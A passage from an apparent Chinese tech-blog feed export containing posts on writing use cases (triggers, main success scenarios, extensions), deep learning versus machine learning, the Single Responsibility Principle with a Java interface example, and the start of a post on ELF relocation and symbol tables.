title="触发事件（Trigger）"></a>触发事件（Trigger）</h2><p>触发事件是指用例启动的事件，用例将通过触发事件，开始一步一步执行。</p><p><strong>规则：触发事件是跟系统交互的第一个操作。</strong></p><p>以用户下单用例为例子，用户决定要购买商品后，在系统中查找商品并下单。那么<em>“用户决定要购买商品”</em>并不能作为用例的触发事件，事实上，用户更系统的交互是从<em>“查找商品”</em>开始的，所以<em>“用户查找商品”</em>才是用例的触发事件。</p><p>我们讨论用户跟系统交互时，还应该注意我们讨论的系统的范围。特别是当主执行者不是直接操作软件系统的场景时，更应该明确系统范围。如，<em>“用户致电客户经理下单”</em>这样的场景下，我们的系统范围并不能限定在软件系统范围内，这是系统范围是公司。所以，<em>“用户致电客户经理”</em>跟我们系统交互的第一步，所以可以成为<em>“触发事件”</em>。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> 最小保证：系统记录用户操作进度的日志。<br> 成功保证：<br> \1. 系统成功创建用户订单。<br> \2. 系统收到用户支付货款。<br> \3. 用户的订单操作和付款信息被记录成日志。<br> 触发事件：用户选中需要购买的物品。<br> ……</p></blockquote><h2 id="主成功场景（Main-Success-Scenario）"><a href="#主成功场景（Main-Success-Scenario）" class="headerlink" title="主成功场景（Main Success Scenario）"></a>主成功场景（Main Success Scenario）</h2><p>主成功场景是用例从触发事件开始，一步一步执行，最终满足用例利益的步骤集合。</p><p>主成功场景应该包括以下信息：</p><ul><li>两个执行者之间的交互。如，用户提交了订单。</li><li>为保证主成功场景得以继续的确认。如，系统确认用户密码。</li><li>主成功场景推进过程中的内部变化。如，系统扣除用户账户余额。</li></ul><p>执行步骤应该有一些简单的规则：</p><p><strong>规则：使用简单语法。</strong></p><p>使用简单语法结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主语……谓语动词……前置短语……宾语。</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统……扣除…一定数量的…用户账户余额。</span><br></pre></td></tr></table></figure><p><strong>规则：准确描述执行者之间的切换。</strong></p><p>执行步骤需要准确描述步骤执行过程中，执行者之间的切换。如，<em>“用户致电客户代表”</em>，我们可以知道步骤已经从用户切换到了客户代表。</p><p>但是，有时候在执行者明确的情况下，也有可能不会出现在句子中。如，<em>“用户输入密码”</em>，我们也可以知道这个步骤的执行者已经从用户切换到了系统。我们不必使用<em>“用户向系统输入密码”</em>这种冗余的描述方式。</p><p><strong>规则：从系统外去描述步骤。</strong></p><p>不应该从系统内部，或者全部以系统角度去考虑而已。而应该从系统外去描述步骤。</p><p>如果从系统内部去描述步骤，可能会写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取用户密码，确认密码正确。</span><br></pre></td></tr></table></figure><p>如果在系统外部去描述步骤，则表述成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户输入密码。</span><br><span class="line">系统确认用户密码正确。</span><br></pre></td></tr></table></figure><p><strong>规则：显示过程向前推移。</strong></p><p>一些小的步骤只能完成少数工作，有时候这些工作并不能很好的描述过程在向前推移。如，<em>“用户点击了确定按钮”</em>。这个步骤并不能很好的描述过程在向前推移，用户的真实目的是登陆系统，随着用户登陆系统，用例步骤可以继续往下执行。</p><p><strong>规则：显示执行者的意图，而不是动作。</strong></p><p>执行者通常是通过操作系统执行一个动作的，在描写用例时，容易将用户动作和执行者的意图搞混。</p><p>例如：<br> \1. 系统要求用户输入身份信息<br> \2. 用户输入用户名密码<br> \3. 用户点击确定按钮<br> \4. 系统确认用户身份信息<br> ……</p><p>用例过多描述了系统操作界面和用户的动作，如<em>“要求用户输入身份信息”</em>，这个并不是执行者的意图，而只是一个交互动作。</p><p>我们可以缩减描述用户动作的步骤，将用例改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.用户输入用户名密码</span><br><span class="line">2.系统确认用户身份信息。</span><br></pre></td></tr></table></figure><p><strong>规则：包含合理的活动集。</strong></p><p>描述步骤的时候，并不一定要求每个步骤之包括一个活动。根据需要可以将部分活动集合在一个步骤里面。</p><p>如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户下单成功。系统发送短信给用户，告知用户订单号。</span><br></pre></td></tr></table></figure><p>这个步骤也可以描述成两个步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户下单成功。</span><br><span class="line">系统发送短信给用户，告知用户订单号。</span><br></pre></td></tr></table></figure><p>用例的描述方式以简单，有效为主，有时候并不拘泥于具体的方式。事实上很多开发团队都形成了自己的用例编写规范。</p><p><strong>规则：步骤描述成功的场景，而不要体现可能的失败。</strong></p><p>主成功场景的步骤描述的是成功的步骤。例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统判断用户信息是否正确。</span><br></pre></td></tr></table></figure><p>如果这样编写步骤，我们将要继续考虑<em>“如果判断正确……”</em>，<em>“如果判断失败……”</em>。但是在主成功场景的步骤中，是不体现失败的步骤的。所以，需要将步骤改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统确认用户信息。</span><br></pre></td></tr></table></figure><p>如果如果系统验证失败怎么办？这部分信息放到扩展里面描述。下文会详细说明，这里不展开。</p><p><strong>规则：当步骤不连续执行是，可以加入时间限制。</strong></p><p>多数情况下，步骤是一步接一步执行的。可在某些时候，可以这样描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当用户选择直接提交订单时，……。</span><br></pre></td></tr></table></figure><p><strong>规则：一个步骤可以涉及多个相关人员。</strong></p><p>我们有时候需要通过一个系统向另一个系统发起一个执行动作，可以写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户通过系统向物流系统获取物流数据。</span><br></pre></td></tr></table></figure><p><strong>规则：可以反复执行一个或多个步骤。</strong></p><p>有时用户会反复执行其中一个或多个步骤，这时候需要在步骤中增加一定的描述。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 用户查找一个商品</span><br><span class="line">2. 用户将商品加入到购物车中。用户可以重复1~2步，直至用户完成商品选购。</span><br><span class="line">3. 用户选中购物车中的商品下单</span><br><span class="line">……</span><br></pre></td></tr></table></figure><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> 最小保证：系统记录用户操作进度的日志。<br> 成功保证：<br> \1. 系统成功创建用户订单。<br> \2. 系统收到用户支付货款。<br> \3. 用户的订单操作和付款信息被记录成日志。<br> 触发事件：用户选中需要购买的物品。<br> 主成功场景：<br> \1. 用户输入需要购买的商品规格和数量。<br> \2. 系统确认商品规格和数量。<br> \3. 系统显示购买价格。<br> \4. 用户完成付款。<br> \5. 系统确认收款后，提示用户下单成功。<br> ……</p></blockquote><h2 id="扩展（Extensions）"><a href="#扩展（Extensions）" class="headerlink" title="扩展（Extensions）"></a>扩展（Extensions）</h2><p>扩展是主成功场景的分支，是指主成功场景在一些其他条件下会完成的不同动作。<strong>请注意，使用“扩展”而非“异常”或“错误”，事实上扩展包括了成功和失败两种可能的条件</strong>。其基本的逻辑是，在执行主成功场景时，如果系统……（检测到意外），那么，……（做一些事情）。</p><p>常见的有可能出现扩展的场景如下：</p><ul><li>另一种可能出现的成功路径。（如：用户设置了自动登陆）</li><li>执行者操作错误。（如：用户输入的密码错误）</li><li>执行者无任何操作。（如：用户输入超时）</li><li>需要系统确认的场景。（如：系统确认用户余额足够）</li><li>辅助执行者或其他相关人员反馈失败。（如：打印机执行打印错误）</li><li>检测到内部错误，并可能产生外部可见的结果。（如：写数据失败）</li><li>关键性能指标不达标。（如：系统超过15秒没有返回成功）</li></ul><p>在这些场景出现后，我们应该在扩展中描述这些场景处理方式，然后回到主成功场景或者退出用例。</p><p><strong>扩展是针对主成功场景的</strong>，所以我们写编写扩展的时候，需要用编号来表明扩展的对应关系：</p><p>主成功场景如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ……</span><br><span class="line">2 系统确认用户密码正确。</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>扩展如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">2a 密码输入错误：……</span><br><span class="line">2b 密码输入超时：……</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>如果是每个步骤都可能会触发的扩展，可以用”*“号来表示，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">* 用户关闭登陆页面：</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>或者如果是某些步骤触发的共有条件，可以加上步骤来表示，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">2-5* 用户关闭登陆页面：</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p><strong>规则：从系统检测到的角度去描述扩展条件。</strong></p><p>扩展条件应该是系统能检测到的条件，而不是发生了什么。如，用户忘记密码了，系统不可能检测到用户是否密码或者是其他的什么原因。从系统检测到的角度去描述，系统只能检测到用户输入错误的密码或者用户输入超时。</p><p><strong>规则：合理化合并扩展条件。</strong></p><p>扩展条件事实上无需枚举出所有的可能出现的场景，和合理的范围内，我们可以将一些扩展条件合并成等价项。判断等价项，有两个标准：</p><ul><li>系统可以检测到的条件。</li><li>系统必须完成的条件。</li></ul><p>例如，用户输入密码的步骤里面，用户可以忘记密码输入错误，也可以手误输入错误或者其他的可能性，这些条件都是系统不可以检测的条件。首先，将这些条件转换成系统可以测试的条件：密码输入错误。转换后，所有条件就可以合并成一个了。</p><p>在来看一下系统可以完成的条件，如，密码输入错误、用户名错误、用户名不存在等，我们系统的处理都是<em>“提示用户名或密码错误或不存在”</em>。这时候可以将条件合并成<em>“系统检测到用户名或密码输入错误”</em>。</p><p>还有一种情况，如果在低层级（如子功能级别）用例已经完整描述了扩展，那么在其高级别（如用户目标级别）用例，可以不用重复冗余描述。比如，在子功能级别用例<em>“保存数据”</em>里面已经完整描述了保存过程中可能出现的各种扩展条件，那么在其上级用例里就可以不用描述了。</p><blockquote><p>【举例】</p><p><strong>用例1：购买商品</strong><br> 主执行者：用户<br> 概述：用户选中商品后，通过系统下订单购买商品并支付货款。不包括管理员处理订单。<br> 范围：电商系统<br> 级别：用户目标<br> 项目相关人员和利益：<br> 用户：希望通过系统下订单购买需要他需要的商品。<br> 系统：记录用户购买的订单，以便给订单管理员处理。<br> 前置条件：用户已经登陆系统。<br> 最小保证：系统记录用户操作进度的日志。<br> 成功保证：<br> \1. 系统成功创建用户订单。<br> \2. 系统收到用户支付货款。<br> \3. 用户的订单操作和付款信息被记录成日志。<br> 触发事件：用户选中需要购买的物品。<br> 主成功场景：<br> \1. 用户输入需要购买的商品规格和数量。<br> \2. 系统确认商品数量。<br> \3. 系统显示购买价格。<br> \4. 用户完成付款。<br> \5. 系统确认收款后，提示用户下单成功。<br> 扩展：<br> 2a: 数量不足：<br> 2a1: 提示用户数量不足，返回步骤1等待用户重新输入。<br> 4a: 用户余额不足：<br> 4a1: 提示用户余额不足，要求用户更换付款方式。<br> 4a2: 用户更换付款方式继续付款。<br> 4b: 用户支付密码错误：<br> 4b1: 提示用户余额不足，提示用户重新输入密码。<br> 4b2: 用户重新输入密码，完成支付。<br> 4b3: 用户连续输入3次错误密码，系统冻结用户付款账户12个小时。<br> 4c: ……<br> ……</p></blockquote><h1 id="Use-Case与需求的关系"><a href="#Use-Case与需求的关系" class="headerlink" title="Use Case与需求的关系"></a>Use Case与需求的关系</h1><p>用例用于表述需求，但是有两点要注意的：</p><ul><li>用例确实是需求。<br> 不需要将用例转化成其他的需求表达方式。用例可以完整的描述系统需求。</li><li>用例不一定是所有需求。<br> 用例只是需求的一部分，用例并不描述外部接口、数据格式、业务规则、性能、可维护性等需求。</li></ul><h1 id="Use-Case-的评价标准"><a href="#Use-Case-的评价标准" class="headerlink" title="Use Case 的评价标准"></a>Use Case 的评价标准</h1><ol><li><p>是否每个Use Case 都包括至少一个actor？</p></li><li><p>是否每个Use Case 都独立于其他Use Case？</p></li><li><p>是否每个Use Case 都有一个简单的行为或事件流？</p></li><li><p>是否每个Use Case 都有一个唯一的、直观的、可扩展的名称，使它不至于在后期被混淆。</p></li><li><p>用户是否容易理解Use Case 的名称和描述。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Use Case 是UML中的重要概念，本文介绍了它的含义及写法。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="SPE" scheme="https://www.fvolcano.red/tags/SPE/"/>
    
  </entry>
  
  <entry>
    <title>什么是深度学习</title>
    <link href="https://www.fvolcano.red/2021/what-is-deep-learning/"/>
    <id>https://www.fvolcano.red/2021/what-is-deep-learning/</id>
    <published>2021-07-12T23:36:30.000Z</published>
    <updated>2021-07-12T23:36:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>介绍了深度学习的概念和其与机器学习的区别。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>深度学习-百度百科/维基百科</li><li><a href="https://easyaitech.medium.com/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-%E7%99%BD%E8%AF%9D%E8%A7%A3%E9%87%8A-8%E4%B8%AA%E4%BC%98%E7%BC%BA%E7%82%B9-4%E4%B8%AA%E5%85%B8%E5%9E%8B%E7%AE%97%E6%B3%95-2d34c5cb7175">一文看懂深度学习（白话解释+8个优缺点+4个典型算法）</a></li><li><a href="https://ww2.mathworks.cn/discovery/deep-learning.html">什么是深度学习</a></li><li><a href="https://gsy00517.github.io/deep-learning20200122164503/">deep learning笔记：端到端学习</a></li></ol><p><img src="/2021/what-is-deep-learning/1625204551825.svg" alt="图 1：神经网络由多个层构成，每个层包含一系列互连节点。网络可能包含数十或数百个隐藏层。"></p><h1 id="各种解释"><a href="#各种解释" class="headerlink" title="各种解释"></a>各种解释</h1><h2 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h2><p><strong>深度学习</strong>（英语：deep learning）是<a href="https://www.wikiwand.com/zh-hans/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0">机器学习</a>的分支，是一种以<a href="https://www.wikiwand.com/zh-hans/%E4%BA%BA%E5%B7%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C">人工神经网路</a>为架构，对资料进行表征学习的<a href="https://www.wikiwand.com/zh-hans/%E7%AE%97%E6%B3%95">算法</a>。</p><p>深度学习是<a href="https://www.wikiwand.com/zh-hans/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0">机器学习</a>中一种基于对数据进行<a href="https://www.wikiwand.com/zh-hans/%E8%A1%A8%E5%BE%81%E5%AD%A6%E4%B9%A0">表征学习</a>的算法。观测值（例如一幅图像）可以使用多种方式来表示，如每个像素强度值的<a href="https://www.wikiwand.com/zh-hans/%E5%90%91%E9%87%8F">向量</a>，或者更抽象地表示成一系列边、特定形状的区域<a href="https://www.wikiwand.com/zh-hans/%E5%B0%BA%E5%BA%A6%E4%B8%8D%E8%AE%8A%E7%89%B9%E5%BE%B5%E8%BD%89%E6%8F%9B">等</a>。而使用某些特定的表示方法更容易从实例中学习任务（例如，人脸识别或面部表情识别）。深度学习的好处是用<a href="https://www.wikiwand.com/zh-hans/%E9%9D%9E%E7%9B%A3%E7%9D%A3%E5%BC%8F%E5%AD%B8%E7%BF%92">非监督式</a>或半监督式（英语：<a href="https://www.wikiwand.com/en/Semi-supervised_learning">Semi-supervised learning</a>）的<a href="https://www.wikiwand.com/zh-hans/%E7%89%B9%E5%BE%81%E5%AD%A6%E4%B9%A0">特征学习</a>和分层<a href="https://www.wikiwand.com/zh-hans/%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96">特征提取</a>高效算法来替代手工获取<a href="https://www.wikiwand.com/zh-hans/%E7%89%B9%E5%BE%81_(%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0)">特征</a>。</p><h2 id="百度百科"><a href="#百度百科" class="headerlink" title="百度百科"></a>百度百科</h2><p>深度学习的概念源于人工神经网络的研究，含多个隐藏层的多层感知器就是一种深度学习结构。深度学习通过组合低层特征形成更加抽象的高层表示属性类别或特征，以发现数据的分布式特征表示。</p><p>深度学习是一类<a href="https://baike.baidu.com/item/%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/12598452">模式分析</a>方法的统称。通过多层处理，逐渐将初始的“低层”特征表示转化为“高层”特征表示后，用“简单模型”即可完成复杂的分类等学习任务。由此可将深度学习理解为进行“特征学习”（feature learning）或“表示学习”（representation learning）。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><img src="https://miro.medium.com/max/875/0*jHGzSx46XNqse7k3.png"></p><h1 id="与机器学习的关系"><a href="#与机器学习的关系" class="headerlink" title="与机器学习的关系"></a>与机器学习的关系</h1><p>以往在机器学习用于现实任务时，描述样本的特征通常需由人类专家来设计，这成为“特征工程”（feature engineering）。众所周知，特征的好坏对泛化性能有至关重要的影响，人类专家设计出好特征也并非易事；特征学习（<a href="https://baike.baidu.com/item/%E8%A1%A8%E5%BE%81%E5%AD%A6%E4%B9%A0/2140515">表征学习</a>）则通过机器学习技术自身来产生好特征，这使机器学习向“全自动数据分析”又前进了一步。与传统的学习方法相比，深度学习方法预设了更多的模型参数，因此模型训练难度更大，根据统计学习的一般规律知道，模型参数越多，需要参与训练的数据量也越大。</p><p>深度学习中的“深度”一词通常是指神经网络中的隐藏层数。传统神经网络只包含 2 到 3 个隐藏层，而深度网络可能包含多达 150 个隐藏层。</p><p>区别于传统的浅层学习，深度学习的不同在于：</p><ol><li><p>强调了模型结构的深度，通常有5层、6层，甚至10多层的隐层节点； </p></li><li><p>明确了特征学习的重要性。也就是说，通过逐层特征变换，将样本在原空间的特征表示变换到一个新特征空间，从而使分类或预测更容易。与人工规则构造特征的方法相比，利用大数据来学习特征，更能够刻画数据丰富的内在信息。</p></li></ol><p><img src="https://miro.medium.com/max/875/0*0m26vYcHghsHL-Bw.jpg"></p><p>深度学习模型可以达到最先进的精确度，有时甚至超出人类的表现。该模型通过使用大量的标签化数据以及包含许多层的神经网络架构得到训练。</p><p>机器学习工作流程起始于从图像手动提取的相关特征。然后使用这些特征创建对图像中的对象进行分类的模型。在深度学习工作流程中，自动从图像提取相关特征。此外，深度学习还执行“<strong>端到端学习</strong>”，即为网络提供原始数据和分配要执行的任务（如分类），而神经网络学习如何自动执行此操作。</p><blockquote><p>端到端学习（end-to-end learning）</p><p>传统机器学习的流程往往由多个独立的模块组成，比如在一个典型的自然语言处理（Natural Language Processing）问题中，包括分词、词性标注、句法分析、语义分析等多个独立步骤，每个步骤是一个独立的任务，其结果的好坏会影响到下一步骤，从而影响整个训练的结果，这就是非端到端的。<br>而深度学习模型在训练过程中，从输入端（输入数据）到输出端得到一个预测结果，该结果与真实结果相比较会得到一个误差，这个误差将用于模型每一层的调整（比如反向传播），这种训练直到模型收敛或达到预期的效果才结束，这就是端到端（end-to-end）的。<br><img src="/2021/what-is-deep-learning/example.png"><br>相比传统方法每一个模块都有较为明确的输出，端到端的深度学习更像是一个神秘的整体。通俗的说，端到端的深度学习能够让“数据说话”。不过这种方法是很吃数据的，因此还不至于在每个领域都胜过甚至代替传统的机器学习方法。</p><p>相比之下，端到端学习省去了每一步中间的数据处理和每一步模型的设计（这往往会涉及相当多的专业知识），但是端到端学习也有两个重要的缺点：</p><ol><li>需要大量的数据</li><li>可能排除有用的人工设计</li></ol></blockquote><p>另一个主要区别是深度学习算法会随数据发散，而浅层学习则会收敛。浅层学习是指当您向网络添加更多示例和训练数据时，在一定性能水平上趋于稳定的机器学习方法。</p><p>深度学习网络的一个主要优势在于，随着数据量增加，它们经常会持续改进。</p><p><img src="/2021/what-is-deep-learning/1625204551894.svg" alt="图 3．将对车辆进行分类的机器学习方法（左）与深度学习（右）进行比较。"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;介绍了深度学习的概念和其与机器学习的区别。&lt;/p&gt;</summary>
    
    
    
    <category term="深度学习" scheme="https://www.fvolcano.red/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>理解实践单一职责原则（SRP）</title>
    <link href="https://www.fvolcano.red/2021/To-understand-SRP/"/>
    <id>https://www.fvolcano.red/2021/To-understand-SRP/</id>
    <published>2021-07-12T04:38:02.000Z</published>
    <updated>2021-07-12T04:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是《设计模式之禅》、《Head First设计模式》中介绍的单一职责原则的读书笔记和拓展延伸。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>《设计模式之禅》</li><li>《Head First设计模式》</li><li></li></ol><h1 id="Single-Responsibility-Principle"><a href="#Single-Responsibility-Principle" class="headerlink" title="Single Responsibility Principle"></a>Single Responsibility Principle</h1><p>从它的名字——单一职责就可以知道它的内容：某个主体应该只有一个工作。</p><blockquote><p>There should never be more than one reason for a class to change. 应该有且仅有一个原因引起类的变更。</p></blockquote><p>虽然这个原则的表述很绝对，但实际操作中不能遵守的情况很多，有时候是条件不允许，有时候是应用了后导致了代码不必要的复杂而放弃。</p><p>第一个例子的IUserInfo接口的设计介绍了该原则应用的一个简单实践：属性和行为应该分开。User的信息，如名字、电话号码等应该与操作User的行为，如删除、添加角色等分开。分开成两个接口后一个负责用户的属性，一个负责用户的行为。</p><p><img src="/2021/To-understand-SRP/image-20210712150348098.png"></p><p>第二个例子从电话的接口介绍了实际情况中职责的区分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IPhone</span> </span>&#123;</span><br><span class="line">    <span class="comment">//拨通电话</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dial</span><span class="params">(String phoneNumber)</span></span>;</span><br><span class="line">    <span class="comment">//通话</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chat</span><span class="params">(Object o)</span></span>;</span><br><span class="line">    <span class="comment">//通话完毕，挂电话</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hangup</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看不太清楚怎么区分职责，但若了解网络传输的相关知识应该不难想出这里面有两个主要的职责：<strong>协议管理</strong>和<strong>数据传输</strong>。</p><blockquote><p>IPhone这个接口可不是只有一个职责，它包含了两个职责：一个是协议管理，一个是数据传送。dial()和hangup()两个方法实现的是协议管理，分别负责拨号接通和挂机；chat()实现 的是数据的传送，把我们说的话转换成模拟信号或数字信号传递到对方，然后再把对方传递 过来的信号还原成我们听得懂的语言。我们可以这样考虑这个问题，协议接通的变化会引起 这个接口或实现类的变化吗？会的！那数据传送（想想看，电话不仅仅可以通话，还可以上网）的变化会引起这个接口或实现类的变化吗？会的！那就很简单了，这里有两个原因都引起了类的变化。这两个职责会相互影响吗？电话拨号，我只要能接通就成，甭管是电信的还是网通的协议；电话连接后还关心传递的是什么数据吗？通过这样的分析，我们发现类图上 的IPhone接口包含了两个职责，而且这两个职责的变化不相互影响，那就考虑拆分成两个接口.</p></blockquote><p><img src="/2021/To-understand-SRP/image-20210712150803172.png"></p><p>这种方式采用了组合，但不太好。一个手机类要把 ConnectionManager和DataTransfer组合在一块才能使用。组合是一种强耦合关系，你和我都有共同的生命期，这样的强耦合关系还不如使用接口实现的方式，而且还增加了类的复杂性，多了两个类。</p><p>疑问：在这个职责区分中，数据传输接口中方法需要连接管理器接口的参数，是否说明</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文是《设计模式之禅》、《Head First设计模式》中介绍的单一职责原则的读书笔记和拓展延伸。&lt;/p&gt;</summary>
    
    
    
    <category term="设计模式" scheme="https://www.fvolcano.red/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="读书笔记" scheme="https://www.fvolcano.red/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>软件性能工程SPE的指标与目标</title>
    <link href="https://www.fvolcano.red/2021/what-is-SPE/"/>
    <id>https://www.fvolcano.red/2021/what-is-SPE/</id>
    <published>2021-07-12T04:03:10.000Z</published>
    <updated>2021-07-12T04:03:10.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>深入理解重定位全过程</title>
    <link href="https://www.fvolcano.red/2021/dig-deep-in-relocation/"/>
    <id>https://www.fvolcano.red/2021/dig-deep-in-relocation/</id>
    <published>2021-07-11T11:06:57.000Z</published>
    <updated>2021-07-11T11:06:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载整理：从编译器、链接器的角度介绍重定位的全过程和利用一个实例帮助理解。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://juejin.cn/post/6844903557758451720">《程序员的自我修养》番外笔记——符号解析与重定位</a></li><li><a href="https://segmentfault.com/a/1190000016433947">彻底理解链接器：四、重定位</a></li></ol><h1 id="重定位过程解析"><a href="#重定位过程解析" class="headerlink" title="重定位过程解析"></a>重定位过程解析</h1><p>重定位分为对定义符号的重定位和对引用符号的重定位，定义符号新的地址只需要加上所在段的新的偏移地址即可，而引用符号的重定位需要用到重定位表与符号表。</p><p>原文：参考资料1</p><h2 id="重定位表与符号表"><a href="#重定位表与符号表" class="headerlink" title="重定位表与符号表"></a>重定位表与符号表</h2><p>对于可重定位的ELF文件来说，它必须包含有重定位表，用来描述如何修改相应的段里的内容。对于每个要重定位的ELF段都有一个对应的重定位表，而一个重定位表往往就是ELF文件中的一个段，所以其实重定位表也可以叫重定位段。</p><p>通过命令可以查看目标文件的重定位表。</p><p><img src="/2021/dig-deep-in-relocation/16149fd6eb0f4bc8"></p><p>OFFSET是重定位的入口偏移，表示该入口在要被重定位的段中的位置。“.text”表示这个重定位表示代码段的重定位表，所以偏移表示代码段中需要被调整的位置。这里的0x1c和0x27分别就是代码段中“mov”指令和“call”指令的<strong>地址部分</strong>。</p><p>重定位过程也伴随着符号的解析过程，每个目标文件都可能定义一些符号，也可能引用到定义在其他目标文件的符号。重定位的过程中，每个重定位的入口都是对一个符号的引用，那么当链接器需要对某个符号的引用进行重定位时，它就要确定这个符号的目标地址。<strong>这时候链接器就会去查找由所有输入目标文件的符号表组成的全局符号表，找到相应的符号后进行重定位</strong>。</p><p>通过命令查看“a.o”的符号表。</p><p><img src="/2021/dig-deep-in-relocation/16149fd6eb3c2da0"></p><p>可以看到shared和swap的类型都是“UND”，即“undefined”未定义类型，在链接器扫描完所有的输入目标文件后，所有这些未定义的符号都应该能够在全局符号表中找到，否则链接器就报符号未定义错误。这种一般都是链接时缺少了某些库，或者输入目标文件路径不正确或符号的声明与定义不一样。</p><h2 id="重定位模式（指令修改方式）"><a href="#重定位模式（指令修改方式）" class="headerlink" 